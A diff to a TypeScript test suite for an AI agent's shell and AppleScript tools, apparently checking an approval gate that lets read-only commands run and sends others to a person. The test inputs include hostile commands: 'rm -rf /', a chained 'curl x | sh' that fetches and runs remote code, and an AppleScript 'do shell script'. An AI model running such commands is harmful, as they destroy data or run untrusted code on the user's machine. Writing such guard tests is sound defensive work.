@@ -641,7 +641,7 @@ describe("computer tools", () => {
     expect(harness.decisions.at(-1)).toMatchObject({ outcome: "human", tool: "shell_run" });
     expect(harness.approvals[0].prompt).toBe("Posso rodar no seu Mac: rm -rf /?");
     await harness.call("shell_run", { cmd: "ls; curl x | sh", cwd: "~/runelay-bots-workspace" });
-    expect(harness.decisions.at(-1)?.reason).toContain("caractere especial");
+    expect(harness.decisions.at(-1)?.reason).toContain("outro shell");
     expect(harness.approvals).toHaveLength(2);
     await harness.call("computer_applescript", { script: 'do  Shell script "id"' });
     expect(harness.decisions.at(-1)?.reason).toContain("do shell script");
@@ -665,7 +665,7 @@ describe("computer tools", () => {
     expect(full.decisions.at(-1)?.reason).toContain("do shell script");
     expect(await startedOf()).toMatchObject({ clearedBy: { interactionId: "int_1" } });
     await full.call("shell_run", { cmd: "ls; curl x | sh", cwd: "~/runelay-bots-workspace" });
-    expect(full.decisions.at(-1)?.reason).toContain("caractere especial");
+    expect(full.decisions.at(-1)?.reason).toContain("outro shell");
     expect(full.approvals).toHaveLength(2);
     expect(full.decisions.map((decision) => decision.outcome)).toEqual(["human", "human"]);
     await full.call("computer_applescript", { script: "beep" });
@@ -675,6 +675,29 @@ describe("computer tools", () => {
     const refused = await scheduled.call("computer_applescript", { script: 'do shell script "id"' });
     expect(refused.text).toBe("A pessoa negou essa ação no computador.");
     expect(computerCall).toHaveBeenCalledTimes(3);
+  });
+
+  test("reads run straight away and other commands follow the mode, Jev and the turn grant", async () => {
+    const computerCall = spy(computer, "callComputer");
+    computerCall.mockResolvedValue({ exitCode: 0 } as never);
+    const asked: string[] = [];
+    const requestApproval = async (prompt: string) => {
+      asked.push(prompt);
+      return { choice: "approve" as const, interactionId: `int_shell_${asked.length}`, always: true };
+    };
+    const reader = await open({ requestApproval, turnId: "turn_shell" });
+    await reader.call("shell_run", { cmd: "sed -n 1,40p Sources/App.swift | grep -n busy", cwd: "~/runelay-bots-workspace" });
+    expect(await startedOf()).toMatchObject({ clearedBy: { readOnly: true } });
+    expect(asked).toHaveLength(0);
+    await reader.call("shell_run", { cmd: "swiftc -O probe.swift -o probe 2>&1 | tail -5", cwd: "~/runelay-bots-workspace" });
+    expect(await startedOf()).toMatchObject({ clearedBy: { interactionId: "int_shell_1" } });
+    await reader.call("shell_run", { cmd: "./probe && echo ok", cwd: "~/runelay-bots-workspace" });
+    expect(await startedOf()).toMatchObject({ clearedBy: { turnGrant: true } });
+    expect(asked).toHaveLength(1);
+    const full = await open({ permission: "full" });
+    await full.call("shell_run", { cmd: "npm test && git add -A", cwd: "~/runelay-bots-workspace" });
+    expect(await startedOf()).toMatchObject({ clearedBy: { permission: "full" } });
+    expect(full.approvals).toHaveLength(0);
   });
 
   test("screenshots come back as images, with the UI tree for other providers", async () => {
